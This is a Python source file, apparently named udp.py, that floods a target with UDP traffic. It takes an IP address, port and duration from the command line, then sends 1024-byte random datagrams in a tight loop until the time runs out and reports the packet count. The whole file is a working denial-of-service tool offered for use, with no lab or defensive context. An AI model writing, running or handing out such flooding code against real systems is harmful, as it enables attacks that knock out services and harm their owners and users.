import socket
import random
import time
import sys

def udp_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    timeout = time.time() + duration
    packet_count = 0

    print(f"Starting UDP flood on {target_ip}:{target_port} for {duration} seconds...")
    
    while True:
        if time.time() > timeout:
            break
        try:
            client.sendto(bytes, (target_ip, target_port))
            packet_count += 1
        except Exception as e:
            print(f"Error: {e}")
            break

    print(f"UDP flood completed. Total packets sent: {packet_count}")

def main():
    if len(sys.argv) < 4:
        print("Usage: python udp.py <IP> <PORT> <DURATION>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])

    udp_flood(target_ip, target_port, duration)

if __name__ == "__main__":
    main()
  
